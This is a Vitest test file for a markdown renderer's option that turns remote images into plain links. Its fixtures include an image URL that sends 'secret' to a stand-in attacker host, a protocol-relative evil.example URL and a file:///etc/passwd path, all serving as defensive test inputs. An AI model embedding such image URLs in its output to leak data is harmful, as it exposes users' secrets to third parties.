import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

describe("renderMarkdown remoteImages", () => {
  it("loads images by default", () => {
    expect(renderMarkdown("![fox](https://example.com/fox.png)")).toContain('<img src="https://example.com/fox.png"');
  });

  it("turns a remote image into a link when remote images are off", () => {
    const html = renderMarkdown("![x](https://evil.example/?d=secret)", { remoteImages: false });
    expect(html).not.toContain("<img");
    expect(html).toContain('<a href="https://evil.example/?d=secret" class="image-link"');
  });

  it("refuses protocol-relative and relative image URLs too", () => {
    for (const src of ["//evil.example/x.png", "x.png", "file:///etc/passwd"]) {
      expect(renderMarkdown(`![x](${src})`, { remoteImages: false })).not.toContain("<img");
    }
  });

  it("labels the link with the alt text, or 'image' when there is none", () => {
    expect(renderMarkdown("![a fox](https://example.com/a.png)", { remoteImages: false })).toMatch(
      /class="image-link"[^>]*>a fox<\/a>/
    );
    expect(renderMarkdown("![](https://example.com/a.png)", { remoteImages: false })).toMatch(
      /class="image-link"[^>]*>image<\/a>/
    );
  });
});
